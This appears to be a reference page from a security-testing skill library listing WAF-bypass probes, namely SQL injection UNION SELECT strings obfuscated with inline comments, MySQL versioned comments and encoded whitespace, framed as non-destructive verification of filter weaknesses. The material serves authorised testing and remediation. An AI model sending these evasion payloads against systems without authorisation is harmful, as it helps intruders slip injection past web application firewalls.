# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`waf-bypass-and-payload-obfuscation-comment-and-whitespace`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `waf-bypass-and-payload-obfuscation-comment-and-whitespace`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Inline comment splitting

**Expected differential:** the comment-split keyword passes where the contiguous keyword is blocked, and the backend oracle confirms the token lexed

```text
id=1/**/UNION/**/SELECT/**/NULL
id=1 UNION SELECT NULL
```

### Versioned comment (MySQL)

**Expected differential:** the MySQL versioned comment executes the keyword while a generic rule skips it

```text
id=1/*!50000UNION*//*!50000SELECT*/NULL
id=1/*!UNION*/ SELECT NULL
```

### Whitespace substitution

**Expected differential:** newline, tab, or form feed replaces the space the rule expects while the parser still tokenizes the keyword

```text
id=1%0aUNION%0aSELECT%0aNULL
id=1%09UNION%09SELECT%09NULL
id=1%0cUNION%0cSELECT%0cNULL
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
